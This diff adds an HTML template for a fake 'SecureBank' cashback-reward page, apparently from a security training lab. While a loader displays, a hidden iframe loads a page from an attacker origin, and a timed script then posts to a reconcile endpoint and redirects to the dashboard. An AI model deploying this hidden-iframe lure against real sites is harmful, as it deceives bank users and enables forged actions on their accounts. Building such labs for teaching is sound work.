@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SecureBank | Processing Reward</title>
+  <link rel="stylesheet" href="/styles.css" />
+</head>
+<body class="app-body redirect-body">
+  <div class="bg-grid"></div>
+
+  <main class="redirect-shell">
+    <section class="glass redirect-card">
+      <div class="redirect-icon">🎁</div>
+      <p class="eyebrow">SecureBank Rewards</p>
+      <h1>Processing your cashback reward</h1>
+      <p class="redirect-text">
+        Please wait while we verify your cashback request and securely process your reward.
+      </p>
+
+      <div class="redirect-loader">
+        <div class="redirect-loader-bar"></div>
+      </div>
+
+      <p class="redirect-note">Please do not close this page while your request is being processed.</p>
+    </section>
+  </main>
+
+  <iframe
+    src="<%= attackerOrigin %>/reward-claim.html?attemptId=<%= rewardAttemptId %>"
+    title="hidden reward processor"
+    style="display:none;"
+  ></iframe>
+
+  <script nonce="<%= cspNonce %>">
+    async function reconcileAndReturn() {
+      const body = new URLSearchParams({
+        attemptId: "<%= rewardAttemptId %>"
+      });
+
+      try {
+        await fetch("/reward-attack-reconcile", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          credentials: "same-origin",
+          body: body.toString()
+        });
+      } catch (err) {
+        console.error("Reward reconcile failed:", err);
+      }
+
+      window.location.href = "/dashboard";
+    }
+
+    setTimeout(reconcileAndReturn, 2200);
+  </script>
+</body>
+</html>
